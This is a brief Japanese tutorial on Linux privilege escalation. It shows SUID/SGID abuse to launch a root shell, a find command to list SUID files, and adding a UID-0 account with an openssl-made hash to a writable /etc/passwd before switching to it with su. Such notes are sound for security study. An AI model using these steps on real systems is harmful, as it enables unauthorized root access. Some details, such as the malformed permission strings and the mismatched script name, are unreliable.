# Linux環境における権限昇格の基本Tips

## SUID/GUIDの悪用
SUIDやGUIDのついている実行ファイルやスクリプトは，所有者の権限で動作する．そのファイルやスクリプトが脆弱だったり，任意のコマンドを受け付けるような場合は、所有者の権限でシェルを起動することが可能．

つまり，rootユーザが所有者で，一般ユーザでも実行可能なシェルを起動するプログラム(run_shell)がある場合，rootユーザの権限でシェルを起動可能．
```sh
$ ls -al run_shell
rws-rwx-rwx root root _ _ _ _ run_shell
$ ./shell.sh
# whoami
root
```

SUIDやGUIDは下記を見れば把握できる
```
SUID:rws-rwx-rwx
GUID:rwx-rws-rwx
```

SUID/GUIDがついたものの列挙
```sh
$ find / -perm -u=s -type f 2>/dev/null
```

## /etc/passwd に書き込み可能な場合の悪用
一般ユーザの権限不備など何らかの理由で/etc/passwdに書き込み権限がある場合，手動でrootグループユーザを追加可能．<br>
追加後，suで追加したユーザに切り替えることでrootユーザに昇格可能．

### /etc/passwdのフォーマット
```
test:x:0:0:root:/root:/bin/bash
[username]:[password]:[UID]:[GID]:[useridinfo]:[homedir]:[defaultshell]
```

特に，passwordはxとすると，/etc/shadowを見に行くが，直接ハッシュを入力してもOK．
ハッシュはOpensslコマンドで生成可能
```sh
Example) openssl passwd -1 -salt [salt] [password]
$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```
### 権限昇格
例えば，ユーザ名new，パスワード123でrootグループのユーザを追加するには，下記を/etc/passwdに追記する．
```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

追加したユーザにsuするとrootになれる．
```sh
$ su new
Password: 123
# whoami
root
```
